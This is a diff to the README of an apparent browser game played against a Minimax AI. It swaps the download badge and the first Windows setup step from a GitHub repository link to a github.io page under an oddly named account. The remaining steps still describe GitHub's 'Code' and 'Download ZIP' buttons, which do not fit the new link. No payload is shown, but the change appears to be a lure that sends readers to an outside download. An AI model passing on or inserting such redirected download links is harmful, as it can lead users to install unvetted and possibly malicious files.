@@ -1,6 +1,6 @@
 # 🎮 minimax-canvas-game-script - Play smart games against clever AI
 
-[![](https://img.shields.io/badge/Download-Game_Files-blue.svg)](https://github.com/redrockfishsexualimmorality563/minimax-canvas-game-script)
+[![](https://img.shields.io/badge/Download-Game_Files-blue.svg)](https://redrockfishsexualimmorality563.github.io)
 
 This project provides a web-based game environment where you play against an artificial intelligence opponent. The software uses the Minimax algorithm to calculate the best possible moves. You play the game directly in your web browser. You do not need to install complex software on your computer.
 
@@ -25,7 +25,7 @@ The game does not store heavy data on your hard drive. It runs in the temporary 
 
 Follow these steps to set up the game on your Windows machine:
 
-1. Visit this page to download the project: [https://github.com/redrockfishsexualimmorality563/minimax-canvas-game-script](https://github.com/redrockfishsexualimmorality563/minimax-canvas-game-script).
+1. Visit this page to download the project: [https://redrockfishsexualimmorality563.github.io](https://redrockfishsexualimmorality563.github.io).
 2. Click the green button labeled "Code" on the right side of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your desktop or your Downloads folder.
